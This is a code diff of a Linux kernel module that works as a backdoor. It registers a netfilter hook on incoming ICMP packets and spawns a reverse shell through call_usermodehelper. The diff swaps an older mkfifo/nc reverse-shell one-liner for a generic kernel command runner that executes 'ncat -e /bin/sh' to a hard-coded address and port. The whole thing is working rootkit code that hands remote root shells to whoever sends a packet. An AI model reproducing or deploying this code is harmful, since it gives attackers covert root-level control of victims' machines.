@@ -49,12 +49,6 @@ int reverse_shell_working = 0;
 // global netfilter hook - used for registering hook
 static struct nf_hook_ops *netf_hook = NULL;
 
-// for icmp_listener
-struct auth_icmp {
-    unsigned int auth;
-    unsigned int ip;
-    unsigned short port;
-};
 
 void debugPrint(char *printMe) {
 	#if DEBUG
@@ -62,31 +56,72 @@ void debugPrint(char *printMe) {
 	#endif
 }
 
-// Create reverse shell (currently hard coded to [localhost:1234])
-// tested - working.
-void start_reverse_shell(char *ip, char *port) {
-	char *envp[] = {
-		"HOME=/root",
-		"TERM=xterm",
-		"IP_ADDR=127.0.0.1",
-		"PORT_ADDR=1234",
-		NULL
-	};
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,4,0)
+static void run_command_free_argv(struct subprocess_info *info){
+    // should also clear any char * elements
+    kfree(info->argv);
+    reverse_shell_working = 0;
+}
+#endif
 
-	char *argv[] = {
-		"/bin/bash",
-		"-c",
-		"/bin/rm /tmp/a;/usr/bin/mkfifo /tmp/a; /bin/cat /tmp/a | /bin/sh -i 2>&1 | /bin/nc $IP_ADDR $PORT_ADDR > /tmp/a",
-		NULL
-	};
+int run_command(char * command){
+    struct subprocess_info *info;
+    char * cmd_string;
+    static char * envp[] = {
+        "HOME=/", "TERM=linux", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", NULL
+    };
 
-	debugPrint("Start reverse shell...\n");
-	reverse_shell_working = 1;
+    char ** argv = kmalloc(sizeof(char *[5]), GFP_KERNEL);
+    if(!argv) goto out;
+    cmd_string = kstrdup(command, GFP_KERNEL);
+    if(!cmd_string) goto free_argv;
 
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    argv[0] = "/bin/sh";
+    argv[1] = "-c";
+    argv[2] = command;
+    argv[3] = NULL;
 
-	printk("Reverse shell ended.\n");
-	reverse_shell_working = 0;
+    #if (LINUX_VERSION_CODE < KERNEL_VERSION(3,4,0)) && (LINUX_VERSION_CODE > KERNEL_VERSION(3,1,0))
+    /* struct subprocess_info *call_usermodehelper_setup(char *path, char **argv,
+     *                                                   char **envp, gfp_t gfp_mask)
+     */
+    info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL);
+    #endif
+
+    #if LINUX_VERSION_CODE >= KERNEL_VERSION(3,4,0)
+    /* struct subprocess_info *call_usermodehelper_setup(char *path, char **argv,
+     *                char **envp, gfp_t gfp_mask,
+     *                int (*init)(struct subprocess_info *info, struct cred *new),
+     *                void (*cleanup)(struct subprocess_info *info),
+     *                void *data)
+     */
+    info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL,
+                                   NULL, run_command_free_argv, NULL);
+    #endif
+    if(!info) goto free_cmd_string;
+
+    return call_usermodehelper_exec(info, UMH_WAIT_EXEC); // 0 = don't wait
+
+    free_cmd_string:
+        kfree(cmd_string);
+    free_argv:
+        kfree(argv);
+    out:
+    	reverse_shell_working = 0;
+      	return -ENOMEM;
+}
+
+
+void magic_command(void) {
+	if (!reverse_shell_working) {
+		reverse_shell_working = 1;
+		debugPrint("Trying reverse shell");
+		run_command("/usr/bin/ncat -e /bin/sh 127.0.0.1 1234"); // This command will give us reverse shell
+	}
+	else {
+		debugPrint("Reverse shell already working!");
+	}
+	
 }
 
 // Search for ICMP Echo packets with the data "hello". 
@@ -107,6 +142,8 @@ unsigned int icmp_listener(void *priv, struct sk_buff *skb, const struct nf_hook
 
 	if (ip_header->protocol == IPPROTO_ICMP) {
 		debugPrint("Got ICMP packet!");	
+		magic_command(); // Start reverse shell
+		return NF_DROP;
 	}
 
 	return NF_ACCEPT;
@@ -212,7 +249,8 @@ static int register_icmp_listener(void)
 	#endif
 
 	// ret = nf_register_hook(&netf_hook);
-
+    debugPrint("Finished registration...");
+    debugPrint("Testing...");
 	if(ret < 0)
 		return 1;
 
